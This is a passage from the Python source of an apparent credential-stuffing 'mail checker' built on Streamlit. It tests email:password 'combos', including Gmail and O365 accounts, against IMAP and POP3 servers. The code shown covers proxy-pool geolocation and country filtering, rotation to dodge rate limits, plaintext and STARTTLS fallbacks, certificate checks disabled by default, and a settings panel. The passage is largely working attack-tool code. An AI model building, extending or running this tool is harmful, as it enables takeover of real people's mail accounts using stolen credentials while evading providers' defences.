    """
    if not ip or ip == "Unknown":
        return ("Unknown", "Unknown")
    now = time.time()
    with _GEO_LOCK:
        hit = _GEO_CACHE.get(ip)
        if hit:
            return hit
        failed = _GEO_FAIL.get(ip)
        if failed and (now - failed) < GEO_FAIL_TTL:
            return ("Unknown", "Unknown")
        wait = max(0.0, _geo_last_call["ts"] + GEO_MIN_INTERVAL - now)
        _geo_last_call["ts"] = now + wait
    if wait > 0:
        time.sleep(min(wait, 3.0))

    country, region, ok = "Unknown", "Unknown", False
    try:
        if requests is not None:
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName",
                             timeout=3)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    country = data.get("country") or "Unknown"
                    region = data.get("regionName") or "Unknown"
                    ok = True
    except Exception:
        ok = False

    with _GEO_LOCK:
        if ok:
            _GEO_CACHE[ip] = (country, region)
            _GEO_FAIL.pop(ip, None)
        else:
            _GEO_FAIL[ip] = time.time()
    return country, region


def public_ip(force=False):
    if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < GEO_CACHE_TTL:
        return _PUBLIC_IP["ip"]
    with _PUBLIC_IP_LOCK:
        if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < GEO_CACHE_TTL:
            return _PUBLIC_IP["ip"]
        ip = ""
        try:
            if requests is not None:
                ip = (requests.get("https://api.ipify.org", timeout=3).text or "").strip()
        except Exception:
            ip = ""
        if not ip:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
            except Exception:
                ip = ""
        if ip:
            _PUBLIC_IP.update(ip=ip, ts=time.time())
        return ip or "Unknown"


def direct_isp(force=False):
    if not force and _DIRECT_ISP["isp"] and time.time() - _DIRECT_ISP["ts"] < GEO_CACHE_TTL:
        return _DIRECT_ISP["isp"]
    ip = public_ip()
    isp = ""
    try:
        if requests is not None and ip and ip != "Unknown":
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,org,as", timeout=3)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    isp = " ".join(str(data.get(k) or "") for k in ("isp", "org", "as")).strip()
    except Exception:
        isp = ""
    _DIRECT_ISP.update(isp=isp, ts=time.time())
    return isp


_VPN_BRANDS = (
    "vpn", "nordvpn", "mullvad", "proton", "expressvpn", "surfshark", "cyberghost",
    "private internet", "ipvanish", "windscribe", "tunnelbear", "hide.me", "purevpn",
    "astrill", "vyprvpn", "hotspot shield", "ivacy", "torguard", "perfect privacy",
    "azirevpn", "airvpn", "openvpn", "wireguard",
)


def vpn_state_label():
    """Say so when the lookup failed instead of asserting VPN OFF."""
    hint = CFG.get("CONNECTION_HINT", "Auto")
    if hint in ("VPN ON", "VPN OFF"):
        return hint
    isp = (direct_isp() or "").lower()
    if not isp:
        return "VPN ? (lookup failed)"
    if any(t in isp for t in _VPN_BRANDS):
        return "VPN ON (auto)"
    return "VPN OFF (auto)"


def direct_geo(force=False):
    if not force and time.time() - _DIRECT_GEO["ts"] < GEO_CACHE_TTL and _DIRECT_GEO["ip"]:
        return dict(_DIRECT_GEO)
    with _DIRECT_GEO_LOCK:
        if not force and time.time() - _DIRECT_GEO["ts"] < GEO_CACHE_TTL and _DIRECT_GEO["ip"]:
            return dict(_DIRECT_GEO)
        ip = public_ip(force=force)
        country, region = geo_lookup(ip)
        _DIRECT_GEO.update(ts=time.time(), ip=ip, country=country,
                           region=region, vpn=vpn_state_label())
        return dict(_DIRECT_GEO)


TLD_COUNTRY = {
    "de": "Germany", "at": "Austria", "ch": "Switzerland", "fr": "France",
    "it": "Italy", "es": "Spain", "pt": "Portugal", "nl": "Netherlands",
    "be": "Belgium", "pl": "Poland", "se": "Sweden", "no": "Norway",
    "dk": "Denmark", "fi": "Finland", "ie": "Ireland", "cz": "Czechia",
    "sk": "Slovakia", "gr": "Greece", "ro": "Romania", "hu": "Hungary",
    "uk": "United Kingdom", "gb": "United Kingdom", "ca": "Canada",
    "us": "United States", "au": "Australia", "nz": "New Zealand",
    "br": "Brazil", "mx": "Mexico", "ar": "Argentina", "cl": "Chile",
    "jp": "Japan", "kr": "South Korea", "in": "India", "tr": "Turkey",
    "za": "South Africa", "ru": "Russia", "ua": "Ukraine", "il": "Israel",
    "lt": "Lithuania", "lv": "Latvia", "ee": "Estonia", "bg": "Bulgaria",
    "hr": "Croatia", "si": "Slovenia", "rs": "Serbia",
}


def tld_country(domain):
    """Country for GEO_CALL.  .com/.net ISPs are covered by the hint map."""
    d = (domain or "").lower().strip()
    if d in DOMAIN_COUNTRY_HINTS:
        return DOMAIN_COUNTRY_HINTS[d]
    for part in reversed(d.split(".")):
        if part in TLD_COUNTRY:
            return TLD_COUNTRY[part]
    return None


def enrich_proxy_geo(proxies, max_workers=8):
    todo = []
    for p in proxies:
        meta = proxy_meta.get(p)
        if not meta or not meta.get("country") or meta.get("country") == "Unknown":
            info = parse_proxy(p)
            if info:
                todo.append((p, info["host"]))
    if not todo:
        return

    def _one(item):
        p, host = item
        return p, host, geo_lookup(host)

    try:
        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            for p, host, (country, region) in ex.map(_one, todo):
                with proxy_lock:
                    m = proxy_meta.setdefault(
                        p, {"fails": 0, "success": 0, "score": 60, "latency_ms": 0})
                    m["country"], m["region"] = country, region
    except Exception as e:
        log_startup(f"WARNING: proxy geo enrichment error: {e}", quiet=True)


def get_available_countries_with_scores():
    try:
        raw = load_proxies()
        country_scores = defaultdict(list)
        for p in raw:
            meta = proxy_meta.get(p, {})
            c = str(meta.get("country", "Unknown")).upper()
            if c == "UNKNOWN" or not c:
                info = parse_proxy(p)
                if info:
                    c = geo_lookup(info["host"])[0].upper()
            country_scores[c].append(meta.get("score", 50))
        ranked = sorted(((c, sum(s) / len(s)) for c, s in country_scores.items() if s),
                        key=lambda x: x[1], reverse=True)
        return [c for c, _ in ranked if c != "UNKNOWN"] + (["UNKNOWN"] if "UNKNOWN" in country_scores else [])
    except Exception:
        return []


if "pool_pick" not in str_lit.session_state:
    str_lit.session_state.pool_pick = None

selected_countries = list(str_lit.session_state.picked_countries)
selected_mix_countries = list(str_lit.session_state.picked_countries)
pool_mode = str_lit.session_state.pool_mode

if str_lit.session_state.pool_locked:
    str_lit.sidebar.success(f"Pool set: {pool_mode}")
    if pool_mode in ("country", "mix"):
        str_lit.sidebar.caption("Picked: " + ", ".join(str_lit.session_state.picked_countries))
    if str_lit.sidebar.button("Change pool"):
        str_lit.session_state.pool_locked = False
        str_lit.session_state.pool_pick = None
        str_lit.rerun()
else:
    str_lit.sidebar.caption("Tap one")
    for _lbl, _mode in (("all", "all"), ("us_only", "us_only"),
                        ("country", "country"), ("mix", "mix")):
        if str_lit.sidebar.button(_lbl, key=f"pool_btn_{_mode}"):
            if _mode in ("country", "mix"):
                str_lit.session_state.pool_pick = _mode
            else:
                str_lit.session_state.pool_mode = _mode
                str_lit.session_state.pool_locked = True
                str_lit.session_state.pool_pick = None
            str_lit.rerun()
    choice = str_lit.session_state.pool_pick
    if choice in ("country", "mix"):
        available_countries = get_available_countries_with_scores() or ["US"]
        _raw_for_scores = load_proxies() if choice == "mix" else []
        with str_lit.sidebar.form("pool_pick_form"):
            picked = []
            for c in available_countries:
                label = c
                if choice == "mix":
                    scores = [proxy_meta.get(p, {}).get("score", 0) for p in _raw_for_scores
                              if str(proxy_meta.get(p, {}).get("country", "")).upper() == c]
                    label = f"{c}  score={max(scores) if scores else 0}"
                if str_lit.checkbox(label, value=c in str_lit.session_state.picked_countries,
                                    key=f"poolchk_{choice}_{c}"):
                    picked.append(c)
            if str_lit.form_submit_button("Done"):
                if not picked:
                    str_lit.sidebar.error("Pick at least one country")
                else:
                    str_lit.session_state.pool_mode = choice
                    str_lit.session_state.picked_countries = picked
                    str_lit.session_state.pool_locked = True
                    str_lit.session_state.pool_pick = None
                    str_lit.rerun()
# @@END 052 CACHE_PROXY_PARSE_PICKER

# @@BLOCK 053 SIDEBAR_SWITCHES deps=043,044,051
str_lit.sidebar.markdown("---")

use_proxy = instant_help(
    "use_proxy",
    "Route all checker requests through proxy nodes to prevent IP rate-limiting. "
    "UNCHECK for a fully direct connection.",
    "Use Proxy", widget_type="checkbox", value=True)
retry_cf = instant_help(
    "retry_cf",
    "After the proxy route fails with a NETWORK error, make one extra pass with a "
    "direct connection.",
    "Retry CF (Direct Retry)", widget_type="checkbox", value=True)
self_signed = instant_help(
    "self_signed",
    "REAL switch. TICKED (default) = accept self-signed / mismatched certs, no "
    "verification attempted. UNTICKED = VERIFY, and if verification fails the handshake "
    "is retried unverified - unless TLS_STRICT is on, in which case the failure is raised "
    "so a bad cert is actually rejected.",
    "Allow Self-Signed", widget_type="checkbox", value=True)
proxy_test_flight = instant_help(
    "proxy_test_flight",
    "Probe every proxy for liveness before it enters the live pool. KEEP THIS ON - it is "
    "what makes Fetch & Test produce a pool that actually works.",
    "Test Flight", widget_type="checkbox", value=True)
skip_app = instant_help(
    "skip_app",
    "Filter out accounts requiring explicit app passwords or token generation upfront. "
    "OFF by default so Gmail/O365 combos are actually CHECKED rather than bucketed away.",
    "Skip Strict App-Only Providers", widget_type="checkbox", value=False)
debug_mode = instant_help(
    "debug_mode",
    "Stream verbose logs and error tracing directly into the UI interface.",
    "Enable Debug Mode", widget_type="checkbox", value=True)

# instant_help() returns None when its internal try/except fires, and `not None` is
# True - which silently flips ALLOW_SELF_SIGNED to False and turns verification ON
# behind your back, in build_cfg()'s "TLS_STRICT": not self_signed.
self_signed = True if self_signed is None else self_signed
# v13.42: the same hazard applies to every other instant_help() widget and they
# were left unguarded.  A None here silently turns the proxy OFF, the direct
# retry OFF, the test flight OFF, the app-skip OFF and debug OFF in build_cfg().
use_proxy = True if use_proxy is None else use_proxy
retry_cf = True if retry_cf is None else retry_cf
proxy_test_flight = True if proxy_test_flight is None else proxy_test_flight
skip_app = False if skip_app is None else skip_app
debug_mode = True if debug_mode is None else debug_mode

try_starttls_ui = str_lit.sidebar.toggle(
    "Enable STARTTLS + plaintext fallback (143 / 110)", value=True, key="ui_starttls",
    help="If implicit TLS on 993/995 fails, retry the host over STARTTLS, then over "
         "plaintext. These rungs get a shorter leash (LEGACY_RUNG_TIMEOUT) because "
         "143/110 are often firewalled from cloud egress."
)

resolved_proxy_mode = str_lit.sidebar.selectbox(
    "Proxy Mode Engine:", options=["aggressive", "fallback", "sticky", "off"], index=1,
    key="ui_proxy_mode",
    help="aggressive: proxy only. fallback: proxy then direct (default, universal). "
         "sticky: one proxy per worker thread. off: never use proxies. With a "
         "provider-wide 407, 'off' is the only mode that can finish a run."
)
# @@END 053 SIDEBAR_SWITCHES

# @@BLOCK 054 BUILD_CFG deps=011,020,046,047,048,049,050,051,052,053
def build_cfg():
    return {
        "MODE_NAME": engine_config.mode_name,
        "PROTOCOLS": list(protocol_pick or PROTOCOL_SELECTION_DEFAULT),
        "MAX_WORKERS_START": workers,
        "MAX_WORKERS_MAX": max(workers * 2, engine_config.max_concurrent_checks),
        "TIMEOUT": timeout,
        "ACCOUNT_DEADLINE": deadline,
        "MAX_ACCOUNTS": max_acc,
        "BLACKLIST_CF": blacklist_cf,
        "PROXY_MODE": resolved_proxy_mode if use_proxy else "off",
        "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
        "ALLOW_SELF_SIGNED": self_signed,
        # unticking "Allow Self-Signed" means STRICT - no silent fallback to unverified.
        "TLS_STRICT": not self_signed,
        "TRY_STARTTLS": try_starttls_ui,
        "TRY_ALT_USERNAME": try_alt_username_ui,
        "CONFIRM_WRONG_ACROSS_HOSTS": confirm_wrong_ui,
        "MAX_HOSTS_PER_DOMAIN": max_hosts_per_domain,
        "PROXY_TEST_FLIGHT": proxy_test_flight,
        "SKIP_STRICT_APP_PROVIDERS": skip_app,
        "DEBUG": debug_mode,
        "MIN_PROXY_SCORE": min_proxy_score,
        "PROXY_PRECHECK_TIMEOUT": proxy_precheck_timeout,
        "PROBE_TIMEOUT": probe_timeout_ui,
        "PROBE_TARGET": probe_target_ui,
        "PROBE_STRICT": probe_strict_ui,
        "PROBE_MAX_TARGETS": probe_max_targets_ui,
        "PROBE_SECOND_SCHEME": probe_second_scheme_ui,
        "PROBER_IDLE_ENABLED": prober_idle_ui,
        "PROBE_SAMPLE_MAX": probe_sample_ui,
        "MAIL_SPOT_CHECK": mail_spot_ui,
        "DEDUPE_PROXIES": dedupe_proxies_ui,
        "ALLOW_BLACKLIST_IPS": allow_blacklist_ips,
        "QUARANTINE_407": proxy_quarantine_ui,
        "HOST_CONCURRENCY": host_concurrency_ui,
        "PROXY_IP_CONCURRENCY": proxy_ip_concurrency_ui,
        "PROXY_SUBUSER_CONCURRENCY": proxy_subuser_concurrency_ui,
        "PROXY_CONCURRENCY": proxy_concurrency_ui,
        "DIRECT_FIRST": direct_first_ui,
        "SAME_HOST_RETRIES": same_host_retries_ui,
        "MAX_ROTATIONS": max_rotations_ui,
        "CHECK_PASS2": pass2_ui,
        "POOL_MODE": pool_mode,
        "SELECTED_COUNTRIES": selected_countries,
        "SELECTED_MIX_COUNTRIES": selected_mix_countries,
        "DYNAMIC_WORKER_SCALING": dynamic_worker_scaling,
        "CUSTOM_WHITELIST": [d.strip().lower() for d in custom_whitelist_input.split(",") if d.strip()],
        "CUSTOM_BLACKLIST": [d.strip().lower() for d in custom_blacklist_input.split(",") if d.strip()],
        "PROXY_FILE": "proxies.txt",
        "RESULTS_DIR": user_file("mail_results"),
        "CACHE_FILE": "domain_cache.json",
        "PROXY_META_FILE": "proxy_meta.json",
        "MAX_PROXY_TRIES": engine_config.max_retries,
        "PROXY_CONNECT_TIMEOUT": engine_config.connect_timeout,
        "FAST_MODE": engine_config.fast_mode,
        "FAILURE_COOLDOWN": engine_config.failure_cooldown,
        "RANDOM_ROTATION": proxy_random_rotation,
        "GEO_CALL": geo_call_proxy,
        "CONNECTION_HINT": my_connection,
        "SMTP_CHECK": smtp_precheck_ui,
    }
# @@END 054 BUILD_CFG

# @@BLOCK 055 APPLY_SETTINGS deps=020,040,054
if "applied_cfg" not in str_lit.session_state:
    str_lit.session_state.applied_cfg = build_cfg()
    str_lit.session_state.applied_cfg_version = CFG_VERSION
elif str_lit.session_state.get("applied_cfg_version") != CFG_VERSION:
    _migrated = build_cfg()
    str_lit.session_state.applied_cfg = _migrated
    str_lit.session_state.applied_cfg_version = CFG_VERSION
    log_startup(f"Config migrated to v{CFG_VERSION} defaults "
                f"(untouched widgets adopted the new defaults).")

_settings_dirty = build_cfg() != str_lit.session_state.applied_cfg
if _settings_dirty:
    str_lit.sidebar.warning("⚠ You have UNAPPLIED settings changes. Click 💾 Apply Settings.")

_btn_c1, _btn_c2 = str_lit.sidebar.columns(2)
with _btn_c1:
    _apply_clicked = str_lit.button("💾 Apply Settings", type="primary", width="stretch")
with _btn_c2:
    _reset_clicked = str_lit.button(
        "♻️ Reset Defaults", width="stretch",
        help="Restore every setting to the universal default (protocols back to IMAP + POP3).")

if _reset_clicked:
    str_lit.session_state["_bb_reset_pending"] = True
    str_lit.rerun()

if _apply_clicked:
    str_lit.session_state.applied_cfg = build_cfg()
    str_lit.session_state.applied_cfg_version = CFG_VERSION
    _reset_gates()
    str_lit.sidebar.success("Settings applied successfully!")
    log_startup("User applied new configuration settings via sidebar control panel.")
    str_lit.rerun()

CFG = str_lit.session_state.applied_cfg

for _k, _v in (
    ("ALLOW_SELF_SIGNED", True), ("TLS_STRICT", False), ("TRY_STARTTLS", True),
    ("TRY_ALT_USERNAME", True), ("CONFIRM_WRONG_ACROSS_HOSTS", True),
    ("MAX_HOSTS_PER_DOMAIN", 3), ("TIMEOUT", ATTEMPT_TIMEOUT_NORMAL),
    ("ACCOUNT_DEADLINE", DEADLINE_NORMAL), ("PROXY_CONNECT_TIMEOUT", 8.0),
    ("FAILURE_COOLDOWN", FAILURE_COOLDOWN_DEFAULT),
    ("FAST_MODE", False), ("BLACKLIST_CF", BLACKLIST_CF_DEFAULT), ("DEBUG", False),
    ("PROXY_TEST_FLIGHT", True),
    ("RETRY_CONNECTION_FAILED", 1), ("MAX_ACCOUNTS", 5000),
    ("MAX_WORKERS_START", WORKERS_NORMAL),
    ("DYNAMIC_WORKER_SCALING", True), ("PROXY_MODE", "fallback"),
    ("ALLOW_BLACKLIST_IPS", False),
    ("RANDOM_ROTATION", True), ("GEO_CALL", False), ("CONNECTION_HINT", "Auto"),
    ("SMTP_CHECK", False),
    ("QUARANTINE_407", True), ("MIN_PROXY_SCORE", MIN_PROXY_SCORE_DEFAULT),
    ("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT),
    ("PROBE_TIMEOUT", PROBE_TIMEOUT_DEFAULT), ("PROBE_TARGET", PROBE_TARGET_DEFAULT),
    ("PROBE_STRICT", PROBE_STRICT_DEFAULT), ("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT),
    ("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT),
    ("PROBE_SECOND_SCHEME", PROBE_SECOND_SCHEME_DEFAULT),
    ("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT),
    ("PROBE_SAMPLE_MAX", 0),
    ("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT),
    ("MAX_ROTATIONS", MAX_ROTATIONS_DEFAULT),
    ("CHECK_PASS2", CHECK_PASS2_DEFAULT),
    ("HOST_CONCURRENCY", HOST_CONCURRENCY_DEFAULT),
    ("PROXY_CONCURRENCY", PROXY_CONCURRENCY_DEFAULT),
    ("PROXY_IP_CONCURRENCY", PROXY_IP_CONCURRENCY_DEFAULT),
    ("PROXY_SUBUSER_CONCURRENCY", PROXY_SUBUSER_CONCURRENCY_DEFAULT),
    ("DIRECT_FIRST", False), ("SAME_HOST_RETRIES", SAME_HOST_RETRIES_DEFAULT),
    ("SKIP_STRICT_APP_PROVIDERS", False),
    ("PROTOCOLS", list(PROTOCOL_SELECTION_DEFAULT)),
):
    CFG.setdefault(_k, _v)

STATE["cfg"] = CFG

log_startup(
    f"ACTIVE CONFIG -> protocols={CFG.get('PROTOCOLS')} mode={CFG.get('MODE_NAME')} "
    f"workers={CFG.get('MAX_WORKERS_START')} "
    f"deadline={CFG.get('ACCOUNT_DEADLINE')}s timeout={CFG.get('TIMEOUT')}s "
    f"proxy_mode={CFG.get('PROXY_MODE')} hosts/domain={CFG.get('MAX_HOSTS_PER_DOMAIN')} "
    f"starttls={CFG.get('TRY_STARTTLS')} alt_user={CFG.get('TRY_ALT_USERNAME')} "
    f"confirm_wrong={CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')} "
    f"self_signed={CFG.get('ALLOW_SELF_SIGNED')} tls_strict={CFG.get('TLS_STRICT')} "
    f"allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
    f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} "
    f"smtp_precheck={CFG.get('SMTP_CHECK')} quarantine_407={CFG.get('QUARANTINE_407')} "
    f"probe_target={CFG.get('PROBE_TARGET')} probe_timeout={CFG.get('PROBE_TIMEOUT')}s "
    f"probe_strict={CFG.get('PROBE_STRICT')} dedupe={CFG.get('DEDUPE_PROXIES')} "
    f"probe_max_targets={CFG.get('PROBE_MAX_TARGETS')} "
    f"probe_scheme2={CFG.get('PROBE_SECOND_SCHEME')} "
    f"prober_idle={CFG.get('PROBER_IDLE_ENABLED')} "
    f"probe_sample={CFG.get('PROBE_SAMPLE_MAX')} mail_spot={CFG.get('MAIL_SPOT_CHECK')} "
    f"max_rotations={CFG.get('MAX_ROTATIONS')} check_pass2={CFG.get('CHECK_PASS2')} "
    f"host_conc={CFG.get('HOST_CONCURRENCY')} ip_conc={CFG.get('PROXY_IP_CONCURRENCY')} "
    f"subuser_conc={CFG.get('PROXY_SUBUSER_CONCURRENCY')} "
    f"proxy_conc={CFG.get('PROXY_CONCURRENCY')} "
    f"direct_first={CFG.get('DIRECT_FIRST')} same_host_retries={CFG.get('SAME_HOST_RETRIES')}"
)
# @@END 055 APPLY_SETTINGS

# @@BLOCK 056 THEME_STUDIO deps=031,055
with str_lit.sidebar.expander("🎨 Theme Studio & Colours", expanded=False):
    th = str_lit.session_state.theme

    _preset_names = list(THEME_PRESETS.keys())
    _seed = {
        "th_preset": th.get("preset", "Aurora") if th.get("preset", "Aurora") in _preset_names else "Aurora",
        "th_g1": th["g1"], "th_g2": th["g2"],
        "th_accent": th["accent"], "th_accent2": th["accent2"],
        "th_bg": th["bg"], "th_panel": th["panel"], "th_text": th["text"],
        "th_radius": int(th.get("radius", 14)),
        "th_glow": bool(th.get("glow", True)),
        "th_glass": bool(th.get("glass", True)),
        "th_animate": bool(th.get("animate", True)),
        "th_hero_title": th.get("hero_title", ""),
        "th_hero_sub": th.get("hero_sub", ""),
    }
    for _k, _v in _seed.items():
        if _k not in str_lit.session_state:
            str_lit.session_state[_k] = _v

    str_lit.selectbox("Preset Gradient", _preset_names, key="th_preset",
                      on_change=_on_preset_change)

    c_a, c_b = str_lit.columns(2)
    with c_a:
        str_lit.color_picker("Gradient Start", key="th_g1")
        str_lit.color_picker("Accent", key="th_accent")
        str_lit.color_picker("Page Background", key="th_bg")
    with c_b:
        str_lit.color_picker("Gradient End", key="th_g2")
        str_lit.color_picker("Accent 2", key="th_accent2")
        str_lit.color_picker("Panel Surface", key="th_panel")

    str_lit.color_picker("Body Text", key="th_text")
    str_lit.slider("Corner Radius", 0, 28, key="th_radius")

    t_a, t_b = str_lit.columns(2)
    with t_a:
        str_lit.toggle("Neon Glow", key="th_glow")
        str_lit.toggle("Glass Blur", key="th_glass")
    with t_b:
        str_lit.toggle("Animated Gradient", key="th_animate")
        str_lit.toggle("Colourised Logs", key="colorize_logs")

    str_lit.text_input("Hero Title", key="th_hero_title")
    str_lit.text_input("Hero Subtitle", key="th_hero_sub")

    b_a, b_b = str_lit.columns(2)
    with b_a:
        str_lit.button("♻️ Reset Theme", on_click=_reset_theme, width="stretch")
    with b_b:
        str_lit.download_button(
            "⬇️ Export Theme",
            data=json.dumps(str_lit.session_state.theme, indent=2),
            file_name="theme.json", mime="application/json",
            width="stretch",
        )

    _sync_theme_from_widgets()
# @@END 056 THEME_STUDIO

# @@BLOCK 057 BOOT_RENDER deps=033,034,055,056
_theme = str_lit.session_state.theme

str_lit.markdown(theme_css(_theme), unsafe_allow_html=True)
render_hero(_theme)

# Display Fit controls belong UNDER the header. fit() in block 007 injects the
# CSS only; the panel is drawn here.
auth.fit_panel(str_lit)

try:
    os.makedirs(CFG["RESULTS_DIR"], exist_ok=True)
    log_startup(f"Verified/Created results directory at '{CFG['RESULTS_DIR']}'.")
except Exception as e:
    log_startup(f"WARNING: Failed to create results directory: {e}")
# @@END 057 BOOT_RENDER

# @@BLOCK 058 FILE_IO deps=039,052
def save_domain_cache():
    try:
        with file_write_lock:
            with cache_lock:
                with open(live_cfg()["CACHE_FILE"], "w", encoding="utf-8") as f:
                    json.dump(domain_cache, f, indent=2)
    except Exception as e:
        warnings.warn(f"Failed to save domain cache: {e}")


def save_proxy_meta():
    try:
        with file_write_lock:
            with proxy_lock:
                with open(live_cfg()["PROXY_META_FILE"], "w", encoding="utf-8") as f:
                    json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        warnings.warn(f"Failed to save proxy meta: {e}")


def proxy_is_blocked(proxy_str):
    if not proxy_str:
        return False
    if live_cfg().get("ALLOW_BLACKLIST_IPS", False):
        return False
    try:
        if proxy_str in circuit_breaker_until and time.time() < circuit_breaker_until[proxy_str]:
            return True
    except Exception:
        pass
    return False


def get_filtered_active_proxies(quiet: bool = False):
    """The pool the engine is allowed to use.  NO silent fallback to the raw list."""
    try:
        raw = load_proxies(quiet=quiet)
        if not raw:
            return []
        try:
            dedupe = bool(live_cfg().get("DEDUPE_PROXIES", DEDUPE_PROXIES_DEFAULT))
        except Exception:
            dedupe = DEDUPE_PROXIES_DEFAULT
        if dedupe:
            raw = list(dict.fromkeys(raw))
        filtered = []
        min_score = live_cfg().get("MIN_PROXY_SCORE", MIN_PROXY_SCORE_DEFAULT)
        mode = live_cfg().get("POOL_MODE", "all")
        chosen_countries = live_cfg().get("SELECTED_COUNTRIES", [])
        chosen_mix = live_cfg().get("SELECTED_MIX_COUNTRIES", [])

        with proxy_lock:
            meta_snapshot = dict(proxy_meta)

        for p in raw:
            if proxy_is_blocked(p):
                continue
            meta = meta_snapshot.get(p, {})
            if meta.get("score", 50) < min_score:
                continue
            country = str(meta.get("country", "Unknown")).upper()
            if mode == "all":
                filtered.append(p)
            elif mode == "us_only":
                if "US" in country or "UNITED STATES" in country:
                    filtered.append(p)
            elif mode == "country":
                if any(cc in country or cc in p.upper() for cc in chosen_countries):
                    filtered.append(p)
            elif mode == "mix":
                if any(mc in country or mc in p.upper() for mc in chosen_mix):
                    filtered.append(p)
            else:
                filtered.append(p)

        log_startup(f"Proxy filtering complete. Active pool contains {len(filtered)} "
                    f"of {len(raw)} candidate(s) (score/geo filter).", quiet=quiet)
        if not filtered:
            log_startup("WARNING: every candidate was filtered out (min score / pool mode / "
                        "circuit breaker). Returning an EMPTY pool - the raw list is NOT "
                        "used as a silent fallback.", quiet=quiet)
            log_probe_event("proxy filter emptied the pool -> 0 candidates (no raw fallback)")
        return filtered
    except Exception as e:
        log_startup(f"WARNING: Error filtering active proxies: {e}", quiet=quiet)
        return load_proxies(quiet=quiet)


all_proxies = load_proxies()
filtered_pool = []  # never snapshotted at import; refreshed by callers before use
# @@END 058 FILE_IO

# @@BLOCK 059 DNS_CACHE deps=024
_DNS_CACHE = STATE.setdefault("dns_cache", {})
_DNS_TTL = 300.0


def _resolve_cached(host, ttl=_DNS_TTL):
    """Cached gethostbyname.  Returns the IP string, or None on failure."""
    h = (host or "").strip().lower()
    if not h:
        return None
    now = time.time()
    with _host_dns_lock:
        hit = _DNS_CACHE.get(h)
        if hit and (now - hit[0]) < ttl:
            return hit[1]
    try:
        ip = socket.gethostbyname(h)
    except Exception:
        ip = None
    with _host_dns_lock:
        _DNS_CACHE[h] = (now, ip)
    return ip


def fast_fail_dns_check(host):
    return _resolve_cached(host) is not None


def _dedupe_hosts_by_ip(hosts, cap=3):
    out, seen_ips = [], set()
    for h in hosts:
        if not h or h in out:
            continue
        ip = _resolve_cached(h) or ("?" + h)
        if ip in seen_ips:
            continue
        seen_ips.add(ip)
        out.append(h)
        if len(out) >= cap:
            break
    if len(out) < cap:
        for h in hosts:
            if len(out) >= cap:
                break
            if h and h not in out:
                out.append(h)
    return out
# @@END 059 DNS_CACHE

# @@BLOCK 060 PROXY_CONNECT deps=022,023,059
def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
    """Open a tunnel.  This is ALWAYS a proxy hop."""
    base_timeout = timeout or live_cfg()["PROXY_CONNECT_TIMEOUT"]
    try:
        with proxy_lock:
            fails = proxy_meta.get(proxy_str, {}).get("fails", 0)
    except Exception:
        fails = 0
    effective_timeout = max(3.0, base_timeout - (fails * 0.1))
    leg_to = max(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6)
    read_to = max(READ_FLOOR_DEFAULT, effective_timeout * 0.9)

    if not proxy_str or proxy_str == "direct":
        if not fast_fail_dns_check(host):
            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
        s = socket.create_connection((host, port),
                                     timeout=max(CONNECT_FLOOR_DEFAULT, effective_timeout * 0.6))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.settimeout(read_to)
        return s

    info = parse_proxy(proxy_str)
    if not info or not SOCKS_OK:
        raise RuntimeError("bad proxy format or socks unavailable")

    last_err = None
    auth_schemes = set()
    for ptype in _scheme_order(proxy_str):
        try:
            kw = {"proxy_type": ptype, "proxy_addr": info["host"],
                  "proxy_port": info["port"], "proxy_rdns": remote_dns}
            if info["user"]:
                kw["proxy_username"] = info["user"]
                kw["proxy_password"] = info["pass"]
            s = socks.create_connection((host, port), timeout=leg_to, **kw)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(read_to)
            _remember_scheme(proxy_str, ptype)
            return s
        except Exception as proxy_ex:
            last_err = proxy_ex
            if _is_proxy_auth_fail(str(proxy_ex)):
                auth_schemes.add(ptype)

    if auth_schemes:
        raise ProxyAuthError(f"Proxy authentication required for {host}:{port}: {last_err}")

    raise ProxyTransportError(f"Proxy tunnel transport failure for {host}:{port}: {last_err}")
# @@END 060 PROXY_CONNECT

# @@BLOCK 061 TLS_LAYER deps=023,059,060
def _tls_context(host: str, verify: bool):
    if verify:
        ctx = ssl.create_default_context()
    else:
        ctx = ssl._create_unverified_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    try:
        ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
    except Exception:
        pass
    return ctx


def _raw_socket(host, port, proxy_str=None, timeout=None):
    t = timeout or live_cfg()["TIMEOUT"]
    read_to = max(READ_FLOOR_DEFAULT, t * 0.9)
    if proxy_str and proxy_str != "direct":
        s = proxy_connect(host, port, proxy_str, timeout=t)
    else:
        if not fast_fail_dns_check(host):
            raise RuntimeError(f"Fast-fail DNS check failed: Host '{host}' does not resolve locally")
        s = socket.create_connection((host, port), timeout=max(CONNECT_FLOOR_DEFAULT, t * 0.6))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.settimeout(read_to)
    return s


def tls_connect(host, port, proxy_str=None, insecure=None, timeout=None):
    """ALLOW_SELF_SIGNED is a REAL switch, and TLS_STRICT is read.

